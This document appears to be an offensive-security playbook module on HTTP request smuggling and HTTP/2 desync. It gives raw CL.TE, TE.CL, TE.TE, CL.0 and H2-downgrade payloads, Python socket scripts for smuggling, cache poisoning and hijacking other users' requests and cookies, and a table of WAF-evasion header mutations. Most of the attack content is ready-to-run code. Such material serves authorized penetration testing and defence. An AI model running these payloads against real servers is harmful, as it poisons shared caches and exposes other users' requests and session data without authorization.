# HTTP Request Smuggling / HTTP/2 Desync

## Trigger

Load when you see:

- Front-end proxy (CDN, WAF, Nginx, HAProxy) + back-end server architecture
- HTTP/2 to HTTP/1.1 protocol downgrade paths
- Chunked Transfer-Encoding or Content-Length headers in POST requests
- Connection: keep-alive header enabling connection reuse
- Cache layer where poisoned responses affect shared users (Varnish, Cloudflare, Fastly)
- Response timing inconsistencies or 502/503 errors on sequential requests

## Attack Surface

- Front-end and back-end disagree on request boundary parsing (CL vs TE)
- HTTP/2 front-end + HTTP/1.1 back-end (desync via protocol downgrade)
- Back-end ignores Content-Length for certain methods (CL.0)
- Server processes multiple `Content-Length` headers differently
- WAF only inspects one interpretation of the request body

## Decision Tree

1. Test CL.TE: send CL header + TE header, front-end uses CL, back-end uses chunked
2. Test TE.CL: front-end uses chunked, back-end uses CL
3. Test TE.TE: both use TE but parse it differently (header obfuscation)
4. Test CL.0: back-end ignores CL entirely (common with HTTP/2)
5. Test HTTP/2 downgrade: H2.CL and H2.TE desync variants
6. If desync confirmed, escalate to cache poisoning or request hijacking

## Techniques

### CL.TE Desync

Front-end uses Content-Length (sends entire body), back-end uses Transfer-Encoding (chunked):

```http
POST / HTTP/1.1
Host: target
Content-Length: 6
Transfer-Encoding: chunked

0

G
```

Front-end sends all 6 bytes (`0\r\n\r\nG`). Back-end parses chunked encoding: `0\r\n\r\n` ends the request, `G` prefixes the next request.

### TE.CL Desync

Front-end uses Transfer-Encoding, back-end uses Content-Length:

```http
POST / HTTP/1.1
Host: target
Content-Length: 4
Transfer-Encoding: chunked

5c
GPOST /admin HTTP/1.1
Host: target
Content-Length: 15

x=1
0
```

Front-end reads the entire chunked body. Back-end reads only 4 bytes (Content-Length: 4), leaving the rest as the next request.

### TE.TE Desync (Header Obfuscation)

Both ends use TE, but header obfuscation makes one ignore it:

```http
POST / HTTP/1.1
Host: target
Content-Length: 13
Transfer-Encoding: chunked
Transfer-Encoding: x

0

SMUGGLED
```

Front-end sees the first TE with valid `chunked`, back-end sees the second TE (invalid `x`) and falls back to CL.

### CL.0 Desync

Back-end ignores Content-Length entirely (treats POST as GET):

```http
POST / HTTP/1.1
Host: target
Content-Length: 0
Transfer-Encoding: chunked

GET /admin HTTP/1.1
Host: internal

```

### Python Raw Socket CL.TE Smuggling

```python
import socket

def smuggle(host, port):
    payload = (
        "POST / HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        "Content-Length: 13\r\n"
        "Transfer-Encoding: chunked\r\n"
        "\r\n"
        "0\r\n"
        "\r\n"
        "SMUGGLED"
    )
    s = socket.socket()
    s.connect((host, port))
    s.send(payload.encode())
    # First response is for the POST
    resp1 = s.recv(4096).decode(errors="ignore")
    # Second response is for the smuggled "SMUGGLED" prefix + next real request
    resp2 = s.recv(4096).decode(errors="ignore")
    print(resp1[:200])
    print(resp2[:200])
    s.close()
```

### Cache Poisoning via Smuggling

```python
import socket

def cache_poison(host, port):
    smuggled = (
        "GET /static/main.js HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        "\r\n"
    )
    payload = (
        "POST / HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Content-Length: {len(smuggled) + 4}\r\n"
        "Transfer-Encoding: chunked\r\n"
        "Transfer-encoding: x\r\n"
        "\r\n"
        "0\r\n"
        "\r\n"
        f"{smuggled}"
    )
    s = socket.socket()
    s.connect((host, port))
    s.send(payload.encode())
    s.recv(4096)
    s.close()
```

### Request Hijacking via Smuggling

```python
def hijack_request(host, port):
    # Smuggle an incomplete POST with a large Content-Length
    smuggled = (
        "POST /search HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        "Content-Length: 200\r\n"
        "\r\n"
        "q="
    )
    chunk_size = format(len(smuggled), "x")
    payload = (
        "POST / HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        "Content-Length: 4\r\n"
        "Transfer-Encoding: chunked\r\n"
        "\r\n"
        f"{chunk_size}\r\n"
        f"{smuggled}"
        "0\r\n\r\n"
    )
    s = socket.socket()
    s.connect((host, port))
    s.send(payload.encode())
    print(s.recv(4096).decode(errors="ignore"))
    s.close()
```

### HTTP/2 Downgrade Desync

```text
:method: POST
:path: /
:authority: target
content-length: 0

GET /admin HTTP/1.1
Host: target

```

The HTTP/2 front-end sees `content-length: 0` and forwards the body to the HTTP/1.1 back-end, which processes `GET /admin` as a new request.

## Bypass

| Block | Bypass |
|-------|--------|
| Standard CL/TE detection | TE case variation: `Transfer-encoding`, `transfer-Encoding` |
| TE blocked | TE with trailing space: `Transfer-Encoding : chunked` |
| WAF detection | TE value mutation: `chunked,gzip`, `xchunked`, `chunked\x20` |
| Standard chunk detection | Append data after 0-size chunk |
| H2 disabled | h2c upgrade via `Upgrade: h2c` |
| CL blocked | Double CL: first for front-end, second for back-end |
| Proxy chain SSRF filtering | Use open redirect on target domain to reach internal services |

## Verification

- Send two requests on the same connection. If the second response looks like it belongs
  to a different request (e.g., 404 for a smuggled path), desync is confirmed.
- For cache poisoning: demonstrate that an unauthenticated user receives the smuggled response.
- For request hijacking: show that the victim's request data (body/cookies) appears in the
  smuggled request output.

## Pitfalls

- Do NOT run high-volume desync tests on production -- they affect other users' requests.
- Desync is often intermittent -- run multiple attempts to confirm.
- HTTP/2 multiplexing means you share one connection with other users naturally; a
  smuggling attack via HTTP/2 is especially dangerous and usually CVSS 9+.
- Some front-ends coalesce HTTP/2 requests -- you need to use HTTP/1.1 to the front-end
  (or force protocol downgrade) to maintain connection control.
- `Content-Length` with space before colon is treated differently by different parsers.
- CL.0 is particularly common with Go backends (net/http ignores CL for certain methods).
